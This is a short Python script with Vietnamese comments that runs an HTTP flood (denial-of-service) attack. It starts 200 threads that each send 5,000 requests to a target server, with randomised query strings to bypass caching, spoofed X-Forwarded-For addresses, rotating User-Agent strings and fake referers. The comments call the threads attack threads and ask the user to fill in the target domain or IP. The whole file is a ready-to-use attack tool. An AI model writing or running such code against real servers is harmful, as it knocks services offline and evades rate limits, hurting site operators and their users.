
import threading
import requests
import random
import string

TARGET = "http://your.server.ip.or.domain"  # ← Thay bằng domain hoặc IP server
THREADS = 200  # Số luồng tấn công (tăng lên tùy máy)
REQUESTS_PER_THREAD = 5000  # Mỗi luồng gửi bao nhiêu request

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def strong_flood():
    session = requests.Session()
    for _ in range(REQUESTS_PER_THREAD):
        try:
            headers = {
                "User-Agent": f"StressBot/{random.randint(1, 1000)}",
                "X-Forwarded-For": ".".join(str(random.randint(0, 255)) for _ in range(4)),
                "Cache-Control": "no-cache",
                "Referer": f"http://google.com/?q={random_string(5)}"
            }
            url = f"{TARGET}?{random_string(6)}={random_string(8)}"
            session.get(url, headers=headers, timeout=2)
            print("[✓] Request sent")
        except:
            print("[x] Timeout or error")

# Khởi chạy tất cả luồng
for _ in range(THREADS):
    threading.Thread(target=strong_flood).start()
